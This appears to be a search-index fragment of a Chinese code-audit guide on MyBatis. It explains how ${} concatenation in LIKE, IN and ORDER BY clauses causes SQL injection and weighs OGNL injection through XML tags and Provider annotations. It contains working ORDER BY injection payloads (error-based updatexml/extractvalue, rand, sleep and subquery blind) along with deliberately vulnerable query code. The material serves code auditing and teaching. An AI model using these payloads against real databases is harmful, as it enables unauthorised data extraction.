if\u76f2\u6ce8 order by if(\u8868\u8fbe\u5f0f,1,(select id from information_schema.tables)) \u5982\u679c\u8868\u8fbe\u5f0f\u4e3afalse\u65f6\uff0csql\u8bed\u53e5\u4f1a\u62a5ERROR 1242 (21000): Subquery returns more than 1 row\u7684\u9519\u8bef\uff0c\u5bfc\u81f4\u67e5\u8be2\u5185\u5bb9\u4e3a\u7a7a\uff0c\u5982\u679c\u8868\u8fbe\u5f0f\u4e3atrue\u662f\uff0c\u5219\u4f1a\u8fd4\u56de\u6b63\u5e38\u7684\u9875\u9762\u3002 OGNL\u6ce8\u5165 if \u4f17\u6240\u5468\u77e5Mybatis\u6709\u5f88\u591a\u901a\u8fc7XML\u6765\u5b9a\u4e49\u7684SQL\u8bed\u53e5\u3002 if\u662f\u5176\u4e2d\u7528\u7684\u8f83\u591a\u7684\u4e00\u7c7b <select id=\"findActiveBlogWithTitleLike\" resultType=\"Blog\"> SELECT * FROM BLOG WHERE state = 'ACTIVE' <if test=\"title != null\"> AND title like #{title} </if> </select> \u5176\u4e2dif\u6807\u7b7e\u7684test\u5c5e\u6027\u662f\u53ef\u4ee5\u4f20\u5165OGNL\u8868\u8fbe\u5f0f\u6765\u9020\u6210OGNL\u6ce8\u5165\u7684\u3002 \u7136\u540eif\u6807\u7b7e\u7684\u5c5e\u6027\u5904\u4e00\u822c\u90fd\u662f\u5199\u6b7b\u7684\uff0c\u4e0d\u592a\u53ef\u63a7\uff0c\u6240\u4ee5\u901a\u8fc7if\u6807\u7b7e\u6765\u9020\u6210OGNL\u6ce8\u5165\u5e0c\u671b\u4e0d\u5927\u3002 choose Mybatis\u7684\u4e00\u79cd\u7c7b\u4f3cswitch case\u7684\u6807\u7b7e <select id=\"findActiveBlogLike\" resultType=\"Blog\"> SELECT * FROM BLOG WHERE state = 'ACTIVE' <choose> <when test=\"title != null\"> AND title like #{title} </when> <when test=\"author != null and author.name != null\"> AND author_name like #{author.name} </when> <otherwise> AND featured = 1 </otherwise> </choose> </select> when\u7684test\u5c5e\u6027\u53ef\u4f20\u5165OGNL\u8868\u8fbe\u5f0f\u9020\u6210OGNL\u6ce8\u5165\uff0c\u4f46\u5982if\u6807\u7b7e\u4e00\u6837\u4e00\u822c\u5199\u6b7b\uff0c\u5e0c\u671b\u4e0d\u5927\u3002 bind bind\u6807\u7b7e\u7528\u4e8e\u521d\u59cb\u5316\u4e00\u4e2a\u53d8\u91cf\u5e76\u7528\u4e8e\u4e0a\u4e0b\u6587 <select id=\"selectBlogsLike\" resultType=\"Blog\"> <bind name=\"pattern\" value=\"'%' + _parameter.getTitle() + '%'\" /> SELECT * FROM BLOG WHERE title LIKE #{pattern} </select> bind\u6807\u7b7e\u7684value\u5c5e\u6027\u5b58\u5728\u7740OGNL\u6ce8\u5165\uff0c\u4e14\u5f88\u6709\u53ef\u80fd\u662f\u53ef\u63a7\u7684\u3002 \u4f46\u662f \u7531\u4e8evalue\u5c5e\u6027\u5bf9OGNL\u8868\u8fbe\u5f0f\u7684\u89e3\u6790\u987a\u5e8f\u95ee\u9898\uff0c\u5bfc\u81f4bind\u6807\u7b7e\u5b9e\u9645\u4e0a\u4e5f\u65e0\u6cd5\u9020\u6210OGNL\u6ce8\u5165\uff0c\u5177\u4f53\u539f\u7406\u5982\u4e0b\u3002 \u6211\u4eec\u6709\u5982\u4e0bMybatis xml\uff0c\u53ef\u89c1name\u662f\u4e00\u4e2a\u53ef\u63a7\u7684\u503c\uff0c\u4e14\u5b58\u5728\u4e8ebind\u6807\u7b7e\u7684value\u5c5e\u6027\u3002 <if test=\"name != null and name !=''\"> <bind name=\"likename\" value=\"name\" /> name like #{likename} </if> \u82e5\u6211\u4eec\u4f20\u5165name=**${@java.lang.Math@min(4,10)}**\uff0c \u7406\u60f3\u60c5\u51b5\u4e0bvalue\u5c5e\u6027\u5e94\u8be5\u4e3a4\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e3a\u5b57\u7b26\u4e32\u503c\u7684${@java.lang.Math\\@min(4,10)} \u7a76\u5176\u539f\u56e0\uff0c\u5c31\u662fOGNL\u5728\u89e3\u6790name\u8fd9\u4e2a\u53d8\u91cf\u65f6\u5c31\u5df2\u7ecf\u89e6\u53d1\u4e86OGNL\u89e3\u6790\uff1a\u628aname\u89e3\u6790\u4e3a\\${@java.lang.Math\\@min(4,10)}\u3002\u5982\u679c\u80fd\u518d\u6765\u4e00\u6b21OGNL\u89e3\u6790\u5c31\u80fd\u628avalue\u6574\u62104\uff0c\u53ef\u662fOGNL\u53ea\u53d1\u751f\u4e00\u6b21\u3002 \u6240\u4ee5bind\u6807\u7b7e\u662f\u57fa\u672c\u4e0a\u65e0\u6cd5ognl\u6ce8\u5165\u7684\uff0c\u9664\u975e\u7a0b\u5e8f\u5458\u76f4\u63a5\u5728value\u653e\u4e00\u4e2aOGNL\u8868\u8fbe\u5f0f\uff08\u4f46\u8fd9\u6837\u4e5f\u8c8c\u4f3c\u4e0d\u53ebOGNL\u6ce8\u5165\u4e86 <if test=\"name != null and name !=''\"> <bind name=\"likename\" value=\"${@java.lang.Math@min(4,10)}\" /> name like #{likename} </if> \\${param} \u53c2\u6570 <select id=\"findTeacherByName\" resultMap=\"BaseResultMap\" parameterType=\"com.example.mybatis.entity.Teacher\"> select id,email from Teacher where name = ${name}; </select> \u5b58\u5728\u53ef\u63a7\u53d8\u91cfname\uff0c\u4f9d\u65e7\u65e0\u6cd5\u6ce8\u5165\uff0c\u539f\u7406\u540cbind\u7684value\u5c5e\u6027\uff0c\u89e3\u6790\u987a\u5e8f\u7684\u95ee\u9898 spirngboot \u6ce8\u91ca\uff08\u552f\u4e00\u7684\u53ef\u80fd\uff09 Mybatis \u4e3aspringboot\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7528\u4e8e\u7b80\u5316SQL\u64cd\u4f5c\u7684\u6ce8\u91ca\uff0c\u610f\u5728\u8ba9\u5f00\u53d1\u4eba\u5458\u4e0d\u7528\u5199\u90a3\u4e48\u591a\u7e41\u7410\u7684XML\u6587\u4ef6\uff0c\u4ee5\u8fbe\u5230\u52a8\u6001SQL\u7684\u6548\u679c @Insert @Update @Delete @Select @InsertProvider @SelectProvider @UpdateProvider @DeleteProvider \u53ef\u89c1\u6ce8\u91ca\u5206\u4e3a\u4e86\u4e24\u7c7b\uff1a\u5e26Provider\u7684\u548c\u4e0d\u5e26Provider\u7684 \u4e0d\u5e26Provider\u7684\u6ce8\u91ca\u4f7f\u7528\u8d77\u6765\u4e5f\u5f88\u7b28\u62d9\u548c\u9e21\u808b\uff0c\u56e0\u4e3a\u4e5f\u8981\u5199\u4e00\u6b21XML\uff0c\u53ea\u4e0d\u8fc7\u662f\u5199\u5728\u6ce8\u91ca\u91cc\u3002\u7531\u4e8e\u672c\u8d28\u8fd8\u662fXML\uff0c\u6240\u4ee5\u9020\u6210OGNL\u6ce8\u5165\u7684\u98ce\u9669\u4e5f\u662f\u5f88\u4f4e\u5f88\u4f4e\u7684 @Update({\"<script>\", \"update Author\", \" <set>\", \" <if test='username != null'>username=#{username},</if>\", \" <if test='password != null'>password=#{password},</if>\", \" <if test='email != null'>email=#{email},</if>\", \" <if test='bio != null'>bio=#{bio}</if>\", \" </set>\", \"where id=#{id}\", \"</script>\"}) void updateAuthorValues(Author author); \u5e26Provider\u7684\u6ce8\u91ca\u4f7f\u7528\u8d77\u6765\u5c31\u9ad8\u7ea7\u4e9b\u4e86\uff0c\u901a\u8fc7\u6ce8\u91ca\u6765\u6307\u5b9a\u751f\u6210SQL\u8bed\u53e5\u7684\u65b9\u6cd5 @SelectProvider(type = UserDaoProvider.class, method = \"findTeacherByName\") Teacher findUserByName(Map<String, Object> map); SelectProvide \u8c03\u7528\u7684\u65b9\u6cd5\u4e3a findTeacherByName \uff0c\u5982\u4e0b\uff1a public String findTeacherByName(Map<String, Object> map) { String name = (String) map.get(\"name\"); String s = new SQL() { { SELECT(\"id,email\"); FROM(\"Teacher\"); if(map.get(\"id\")!=null) WHERE(\"name=#{name}\"); } }.toString(); return s; } } \u8fd9\u6837\u7684\u52a8\u6001SQL\uff0c\u53ef\u4ee5\u5148\u8fdb\u884c\u4e00\u8f6eOGNL\u89e3\u6790\uff0c\u518d\u628a\u89e3\u6790\u7ed3\u679c\u751f\u6210\u4e3a\u5bf9\u5e94\u7684XML\u6587\u4ef6\u7684\u5f62\u6001\uff08\u5b9e\u9645\u4e0a\u5e76\u672a\u751f\u6210\uff0c\u53ea\u662f\u4e00\u4e2a\u6bd4\u55bb\uff09\uff0c\u6700\u540eXML\u6587\u4ef6\u88abOGNL\u518d\u6b21\u89e3\u6790\uff0c\u4ece\u800c\u5bfc\u81f4OGNL\u6ce8\u5165\u3002 \u5982\u4e0b\u60c5\u5f62\u90fd\u53ef\u4f7f\u7528\uff0c\u53ea\u8981\u662f\u62fc\u63a5\u90fd\u53ef\u4ee5\u6253 WHERE(\"name=#{name}\"); WHERE(\"name=\" + name); String sql = \"select id,email from Teacher where name = \" + name; String name = (String) map.get(\"name\"); String finalName = String.format(\" name in (%s)\", name); String sql = new SQL() {{ SELECT(\"id,email\"); FROM(\"Teacher\"); WHERE(finalName); ORDER_BY(\"id desc\"); }}.toString(); \u53ef\u7528\u8303\u56f4 mybatis-spring-boot-starter >=2.0.1\uff08mybatis-spring-boot-starter\u7ec4\u4ef6\u4ece2.0.1\u7248\u672c\u5f00\u59cb\u652f\u6301Provider\u52a8\u6001SQL\uff09 \u6216\u8005 Mybatis \u5168\u7248\u672c \u6216\u8005 mybatis-plus-boot-starter >=3.1.1 \u5173\u952e\u5b57 \u76f4\u63a5\u5168\u5c40\u641c\u7d22xml\u6587\u4ef6\u7684 \\$ \u7b26\u5373\u53ef \u627e\u5230\u53ef\u7591\u7684sql\u8bed\u53e5\u540e\u5c31\u770bxml\u6807\u7b7e\u91cc\u7684id\u5c5e\u6027\u5b9a\u4f4d\u5230\u8c03\u7528\u7c7b\uff0c\u5982\u679c\u80fd\u4e00\u6b65\u5b9a\u4f4d\u5230controller\u6700\u597d\uff0c\u7136\u540e\u5411\u4e0a\u6478\u7d22\u3002","title":"Mybatis"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#mybatis","text":"","title":"Mybatis"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#_1","text":"\u7b80\u4ecb \u539f\u7406 \\$\u548c# like in order by OGNL\u6ce8\u5165 if choose bind \\${param} \u53c2\u6570 spirngboot \u6ce8\u91ca\uff08\u552f\u4e00\u7684\u53ef\u80fd\uff09 \u5173\u952e\u5b57","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#_2","text":"Mybatis\u662fjava\u91cc\u7684\u6570\u636e\u5e93\u6a21\u5757\uff0c\u7528\u4e8e\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\uff0c\u5c5e\u4e8edao\u5c42\u3002","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#_3","text":"","title":"\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#_4","text":"Mybatis\u5728\u5b9a\u4e49sql\u8bed\u53e5\u65f6\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u6ce8\u91ca\u5f62\u5f0f\u548cxml\u5f62\u5f0f\uff0c\u5176\u4e2dxml\u5f62\u5f0f\u7528\u7684\u66f4\u591a\u4e00\u70b9 xml\u5f62\u5f0f\uff1a \u6ce8\u91ca\u5f62\u5f0f,\u672c\u8d28\u4e0a\u548cxml\u5f62\u5f0f\u5dee\u4e0d\u591a\u53ea\u662f\u5199\u5728\u4e86\u6301\u4e45\u5c42\u63a5\u53e3\u7684\u6ce8\u91ca\u91cc\uff0c\u7528\u7684\u4e0d\u591a\u3002 \u5728mybatis\u91cc\uff0csql\u8bed\u53e5\u4e0e\u53c2\u6570\u8fdb\u884c\u62fc\u63a5\u65f6\uff0c\u6709\u4e24\u79cd\u7b26\u53f7#\u548c\\$ SELECT * FROM NEWS WHERE ID = #{id} SELECT * FROM NEWS WHERE ID = ${id} \u4ed6\u4eec\u7684\u533a\u522b\u5c31\u662f#\u662f\u542f\u7528\u4e86\u9884\u7f16\u8bd1\uff0c\u800c\\$\u6ca1\u6709\u542f\u7528\u3002 \u6240\u4ee5\u5ba1mybatis\u65f6\u53ef\u4ee5\u91cd\u70b9\u5173\u6ce8\\$\u7b26\u7684\u62fc\u63a5\u3002 \u540c\u65f6\u8fd8\u6709\u4e0b\u9762\u7684\u51fd\u6570\u4e5f\u503c\u5f97\u5173\u6ce8","title":"\\$\u548c#"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#like","text":"\u65b0\u624b\u5728like\u540e\u9762\u63d2\u5165\u53c2\u6570\u65f6\u5f80\u5f80\u4f1a\u5199\u9519\u50cf\u8fd9\u6837 Select * from news where title like \u2018%#{title}%\u2019 \u4f46\u8fd9\u6837\u4f1a\u62a5\u9519\uff0c\u6709\u53ef\u80fd\u65b0\u624b\u7a0b\u5e8f\u5458\u5c31\u76f4\u63a5\u628a#\u6539\u6210\\$\u4e86\uff0c\u4ece\u800c\u9020\u6210\u6ce8\u5165 \u8fd9\u6837\u6539\u5c31\u6ca1\u4e8b\u4e86\uff0c\u5b89\u5168\u4e86 select * from news where tile like concat(\u2018%\u2019,#{title}, \u2018%\u2019)","title":"like"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#in","text":"\u540c\u7406\uff0cin\u65b0\u624b\u4e5f\u53ef\u80fd\u5199\u6210\u8fd9\u6837\u4ece\u800c\u62a5\u9519\uff0c\u7136\u540e\u6539\u6210\\$ Select * from news where id in (#{ids}) \u6b63\u786e\u5199\u6cd5\u5982\u4e0b id in <foreach collection=\"ids\" item=\"item\" open=\"(\"separatosr=\",\" close=\")\"> ##{ids} </foreach>","title":"in"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#order-by","text":"\u53ea\u80fd\u7528\\$\uff0c\u4e0d\u80fd\u7528#\u5f00\u542f\u9884\u7f16\u8bd1 \u539f\u7406\u662forder by\u540e\u9762\u7684\u53c2\u6570\u4e0d\u80fd\u53c2\u6570\u5316\uff0c\u5728\u53c2\u6570\u88ab\u9884\u7f16\u8bd1\u53c2\u6570\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u52a0\u4e0a\u5f15\u53f7\uff0c\u4ece\u800c\u5bfc\u81f4order by\u540e\u9762\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u503c\uff0c\u4f46\u662forder by\u540e\u9762\u53ea\u80fd\u8ddf\u5b57\u6bb5\u540d\u800c\u4e0d\u80fd\u8ddf\u5b57\u7b26\u4e32\u503c\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u5177\u4f53\u6ce8\u5165payload \u62a5\u9519\u6ce8\u5165 select * from ha order by updatexml(1,if(1=1,1,user()),1);#\u67e5\u8be2\u6b63\u5e38 select * from ha order by updatexml(1,if(1=2,1,user()),1);#\u67e5\u8be2\u62a5\u9519 select * from ha order by extractvalue(1,if(1=1,1,user()));#\u67e5\u8be2\u6b63\u5e38 select * from ha order by extractvalue(1,if(1=2,1,user()));#\u67e5\u8be2\u62a5\u9519 rand\u76f2\u6ce8 \u5f53rand\u91cc\u7684\u503c\u5206\u522b\u4e3afalse\u548ctrue\u7684\u65f6\u5019\uff0c\u6392\u5217\u72b6\u51b5\u4f1a\u4e0d\u4e00\u6837 rand(ascii(mid((select database()),1,1))>96) \u65f6\u95f4\u76f2\u6ce8 order by if(1=1,1,sleep(1)) if\u76f2\u6ce8 order by if(\u8868\u8fbe\u5f0f,1,(select id from information_schema.tables)) \u5982\u679c\u8868\u8fbe\u5f0f\u4e3afalse\u65f6\uff0csql\u8bed\u53e5\u4f1a\u62a5ERROR 1242 (21000): Subquery returns more than 1 row\u7684\u9519\u8bef\uff0c\u5bfc\u81f4\u67e5\u8be2\u5185\u5bb9\u4e3a\u7a7a\uff0c\u5982\u679c\u8868\u8fbe\u5f0f\u4e3atrue\u662f\uff0c\u5219\u4f1a\u8fd4\u56de\u6b63\u5e38\u7684\u9875\u9762\u3002","title":"order by"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#ognl","text":"","title":"OGNL\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#if","text":"\u4f17\u6240\u5468\u77e5Mybatis\u6709\u5f88\u591a\u901a\u8fc7XML\u6765\u5b9a\u4e49\u7684SQL\u8bed\u53e5\u3002 if\u662f\u5176\u4e2d\u7528\u7684\u8f83\u591a\u7684\u4e00\u7c7b <select id=\"findActiveBlogWithTitleLike\" resultType=\"Blog\"> SELECT * FROM BLOG WHERE state = 'ACTIVE' <if test=\"title != null\"> AND title like #{title} </if> </select> \u5176\u4e2dif\u6807\u7b7e\u7684test\u5c5e\u6027\u662f\u53ef\u4ee5\u4f20\u5165OGNL\u8868\u8fbe\u5f0f\u6765\u9020\u6210OGNL\u6ce8\u5165\u7684\u3002 \u7136\u540eif\u6807\u7b7e\u7684\u5c5e\u6027\u5904\u4e00\u822c\u90fd\u662f\u5199\u6b7b\u7684\uff0c\u4e0d\u592a\u53ef\u63a7\uff0c\u6240\u4ee5\u901a\u8fc7if\u6807\u7b7e\u6765\u9020\u6210OGNL\u6ce8\u5165\u5e0c\u671b\u4e0d\u5927\u3002","title":"if"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#choose","text":"Mybatis\u7684\u4e00\u79cd\u7c7b\u4f3cswitch case\u7684\u6807\u7b7e <select id=\"findActiveBlogLike\" resultType=\"Blog\"> SELECT * FROM BLOG WHERE state = 'ACTIVE' <choose> <when test=\"title != null\"> AND title like #{title} </when> <when test=\"author != null and author.name != null\"> AND author_name like #{author.name} </when> <otherwise> AND featured = 1 </otherwise> </choose> </select> when\u7684test\u5c5e\u6027\u53ef\u4f20\u5165OGNL\u8868\u8fbe\u5f0f\u9020\u6210OGNL\u6ce8\u5165\uff0c\u4f46\u5982if\u6807\u7b7e\u4e00\u6837\u4e00\u822c\u5199\u6b7b\uff0c\u5e0c\u671b\u4e0d\u5927\u3002","title":"choose"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#bind","text":"bind\u6807\u7b7e\u7528\u4e8e\u521d\u59cb\u5316\u4e00\u4e2a\u53d8\u91cf\u5e76\u7528\u4e8e\u4e0a\u4e0b\u6587 <select id=\"selectBlogsLike\" resultType=\"Blog\"> <bind name=\"pattern\" value=\"'%' + _parameter.getTitle() + '%'\" /> SELECT * FROM BLOG WHERE title LIKE #{pattern} </select> bind\u6807\u7b7e\u7684value\u5c5e\u6027\u5b58\u5728\u7740OGNL\u6ce8\u5165\uff0c\u4e14\u5f88\u6709\u53ef\u80fd\u662f\u53ef\u63a7\u7684\u3002 \u4f46\u662f \u7531\u4e8evalue\u5c5e\u6027\u5bf9OGNL\u8868\u8fbe\u5f0f\u7684\u89e3\u6790\u987a\u5e8f\u95ee\u9898\uff0c\u5bfc\u81f4bind\u6807\u7b7e\u5b9e\u9645\u4e0a\u4e5f\u65e0\u6cd5\u9020\u6210OGNL\u6ce8\u5165\uff0c\u5177\u4f53\u539f\u7406\u5982\u4e0b\u3002 \u6211\u4eec\u6709\u5982\u4e0bMybatis xml\uff0c\u53ef\u89c1name\u662f\u4e00\u4e2a\u53ef\u63a7\u7684\u503c\uff0c\u4e14\u5b58\u5728\u4e8ebind\u6807\u7b7e\u7684value\u5c5e\u6027\u3002 <if test=\"name != null and name !=''\"> <bind name=\"likename\" value=\"name\" /> name like #{likename} </if> \u82e5\u6211\u4eec\u4f20\u5165name=**${@java.lang.Math@min(4,10)}**\uff0c \u7406\u60f3\u60c5\u51b5\u4e0bvalue\u5c5e\u6027\u5e94\u8be5\u4e3a4\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e3a\u5b57\u7b26\u4e32\u503c\u7684${@java.lang.Math\\@min(4,10)} \u7a76\u5176\u539f\u56e0\uff0c\u5c31\u662fOGNL\u5728\u89e3\u6790name\u8fd9\u4e2a\u53d8\u91cf\u65f6\u5c31\u5df2\u7ecf\u89e6\u53d1\u4e86OGNL\u89e3\u6790\uff1a\u628aname\u89e3\u6790\u4e3a\\${@java.lang.Math\\@min(4,10)}\u3002\u5982\u679c\u80fd\u518d\u6765\u4e00\u6b21OGNL\u89e3\u6790\u5c31\u80fd\u628avalue\u6574\u62104\uff0c\u53ef\u662fOGNL\u53ea\u53d1\u751f\u4e00\u6b21\u3002 \u6240\u4ee5bind\u6807\u7b7e\u662f\u57fa\u672c\u4e0a\u65e0\u6cd5ognl\u6ce8\u5165\u7684\uff0c\u9664\u975e\u7a0b\u5e8f\u5458\u76f4\u63a5\u5728value\u653e\u4e00\u4e2aOGNL\u8868\u8fbe\u5f0f\uff08\u4f46\u8fd9\u6837\u4e5f\u8c8c\u4f3c\u4e0d\u53ebOGNL\u6ce8\u5165\u4e86 <if test=\"name != null and name !=''\"> <bind name=\"likename\" value=\"${@java.lang.Math@min(4,10)}\" /> name like #{likename} </if>","title":"bind"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#param","text":"<select id=\"findTeacherByName\" resultMap=\"BaseResultMap\" parameterType=\"com.example.mybatis.entity.Teacher\"> select id,email from Teacher where name = ${name}; </select> \u5b58\u5728\u53ef\u63a7\u53d8\u91cfname\uff0c\u4f9d\u65e7\u65e0\u6cd5\u6ce8\u5165\uff0c\u539f\u7406\u540cbind\u7684value\u5c5e\u6027\uff0c\u89e3\u6790\u987a\u5e8f\u7684\u95ee\u9898","title":"\\${param} \u53c2\u6570"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#spirngboot","text":"Mybatis \u4e3aspringboot\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7528\u4e8e\u7b80\u5316SQL\u64cd\u4f5c\u7684\u6ce8\u91ca\uff0c\u610f\u5728\u8ba9\u5f00\u53d1\u4eba\u5458\u4e0d\u7528\u5199\u90a3\u4e48\u591a\u7e41\u7410\u7684XML\u6587\u4ef6\uff0c\u4ee5\u8fbe\u5230\u52a8\u6001SQL\u7684\u6548\u679c @Insert @Update @Delete @Select @InsertProvider @SelectProvider @UpdateProvider @DeleteProvider \u53ef\u89c1\u6ce8\u91ca\u5206\u4e3a\u4e86\u4e24\u7c7b\uff1a\u5e26Provider\u7684\u548c\u4e0d\u5e26Provider\u7684 \u4e0d\u5e26Provider\u7684\u6ce8\u91ca\u4f7f\u7528\u8d77\u6765\u4e5f\u5f88\u7b28\u62d9\u548c\u9e21\u808b\uff0c\u56e0\u4e3a\u4e5f\u8981\u5199\u4e00\u6b21XML\uff0c\u53ea\u4e0d\u8fc7\u662f\u5199\u5728\u6ce8\u91ca\u91cc\u3002\u7531\u4e8e\u672c\u8d28\u8fd8\u662fXML\uff0c\u6240\u4ee5\u9020\u6210OGNL\u6ce8\u5165\u7684\u98ce\u9669\u4e5f\u662f\u5f88\u4f4e\u5f88\u4f4e\u7684 @Update({\"<script>\", \"update Author\", \" <set>\", \" <if test='username != null'>username=#{username},</if>\", \" <if test='password != null'>password=#{password},</if>\", \" <if test='email != null'>email=#{email},</if>\", \" <if test='bio != null'>bio=#{bio}</if>\", \" </set>\", \"where id=#{id}\", \"</script>\"}) void updateAuthorValues(Author author); \u5e26Provider\u7684\u6ce8\u91ca\u4f7f\u7528\u8d77\u6765\u5c31\u9ad8\u7ea7\u4e9b\u4e86\uff0c\u901a\u8fc7\u6ce8\u91ca\u6765\u6307\u5b9a\u751f\u6210SQL\u8bed\u53e5\u7684\u65b9\u6cd5 @SelectProvider(type = UserDaoProvider.class, method = \"findTeacherByName\") Teacher findUserByName(Map<String, Object> map); SelectProvide \u8c03\u7528\u7684\u65b9\u6cd5\u4e3a findTeacherByName \uff0c\u5982\u4e0b\uff1a public String findTeacherByName(Map<String, Object> map) { String name = (String) map.get(\"name\"); String s = new SQL() { { SELECT(\"id,email\"); FROM(\"Teacher\"); if(map.get(\"id\")!=null) WHERE(\"name=#{name}\"); } }.toString(); return s; } } \u8fd9\u6837\u7684\u52a8\u6001SQL\uff0c\u53ef\u4ee5\u5148\u8fdb\u884c\u4e00\u8f6eOGNL\u89e3\u6790\uff0c\u518d\u628a\u89e3\u6790\u7ed3\u679c\u751f\u6210\u4e3a\u5bf9\u5e94\u7684XML\u6587\u4ef6\u7684\u5f62\u6001\uff08\u5b9e\u9645\u4e0a\u5e76\u672a\u751f\u6210\uff0c\u53ea\u662f\u4e00\u4e2a\u6bd4\u55bb\uff09\uff0c\u6700\u540eXML\u6587\u4ef6\u88abOGNL\u518d\u6b21\u89e3\u6790\uff0c\u4ece\u800c\u5bfc\u81f4OGNL\u6ce8\u5165\u3002 \u5982\u4e0b\u60c5\u5f62\u90fd\u53ef\u4f7f\u7528\uff0c\u53ea\u8981\u662f\u62fc\u63a5\u90fd\u53ef\u4ee5\u6253 WHERE(\"name=#{name}\"); WHERE(\"name=\" + name); String sql = \"select id,email from Teacher where name = \" + name; String name = (String) map.get(\"name\"); String finalName = String.format(\" name in (%s)\", name); String sql = new SQL() {{ SELECT(\"id,email\"); FROM(\"Teacher\"); WHERE(finalName); ORDER_BY(\"id desc\"); }}.toString(); \u53ef\u7528\u8303\u56f4 mybatis-spring-boot-starter >=2.0.1\uff08mybatis-spring-boot-starter\u7ec4\u4ef6\u4ece2.0.1\u7248\u672c\u5f00\u59cb\u652f\u6301Provider\u52a8\u6001SQL\uff09 \u6216\u8005 Mybatis \u5168\u7248\u672c \u6216\u8005 mybatis-plus-boot-starter >=3.1.1","title":"spirngboot \u6ce8\u91ca\uff08\u552f\u4e00\u7684\u53ef\u80fd\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Mybatis/Mybatis/#_5","text":"\u76f4\u63a5\u5168\u5c40\u641c\u7d22xml\u6587\u4ef6\u7684 \\$ \u7b26\u5373\u53ef 